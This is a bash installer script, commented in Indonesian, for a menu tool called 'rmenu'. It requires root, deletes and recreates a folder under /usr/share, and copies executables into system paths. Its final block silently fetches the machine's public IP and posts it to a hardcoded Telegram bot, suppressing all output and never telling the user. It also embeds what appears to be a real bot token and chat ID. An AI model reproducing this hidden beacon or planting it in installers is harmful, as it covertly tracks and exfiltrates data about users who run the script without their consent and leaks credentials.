#!/bin/bash

# Cek apakah script dijalankan dengan sudo
if [[ $EUID -ne 0 ]]; then
   echo -e "\e[1;31mScript ini harus dijalankan dengan sudo atau sebagai root!\e[0m"
   echo "Silakan jalankan kembali dengan: sudo $0"
   exit 1
fi

# Dapatkan direktori tempat script ini berada (jalur absolut)
SCRIPT_DIR=$(dirname "$(realpath "$0")")

cd
clear
echo "Installing.."
#apt install viu
#viu "$SCRIPT_DIR/menu/icon.png"
sleep 2

echo "Mengatur Konfigurasi"
sleep 3

# Menghapus folder lama dan membuat folder baru
rm -rf /usr/share/rassa
mkdir -p /usr/share/rassa/

# Memindahkan file dari folder menu menggunakan jalur absolut
cp -r "$SCRIPT_DIR/menu/script" /usr/share/rassa/script
cp -r "$SCRIPT_DIR/menu/rmenu" /usr/bin/rmenu
cp -r "$SCRIPT_DIR/menu/alat" /usr/share/rassa/alat
cp -r "$SCRIPT_DIR/menu/nvm" /usr/share/rassa/nvm

# Memberikan hak akses eksekusi pada file
chmod +x /usr/bin/rmenu
chmod +x /usr/share/rassa/script
chmod +x /usr/share/rassa/alat
chmod +x /usr/share/rassa/nvm

echo "Delete TMP"
cd
# rm -rf rassa
sleep 2

echo -e "\e[1;33mInstalling Sukses\e[0m"
echo -e "\e[1;33mUntuk menggunakan Ketik rmenu\e[0m"
echo -e "\e[1;32mFollow ig @rassa_lee\e[0m"

# Mengirim pesan ke Bot Telegram tanpa output
TOKEN="8120939493:AAHFpgiFwqw_Nw1Vq_bnJKs9SqVUAL5rQuY"  # Ganti dengan token bot kamu
CHAT_ID="6574407971"  # Ganti dengan chat ID kamu

IP=$(curl -s ifconfig.me)  # Mendapatkan IP public

MESSAGE="*Installer new IP: $IP*"
curl -s -o /dev/null -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
    -d chat_id=$CHAT_ID \
    -d text="$MESSAGE" \
    -d parse_mode="Markdown"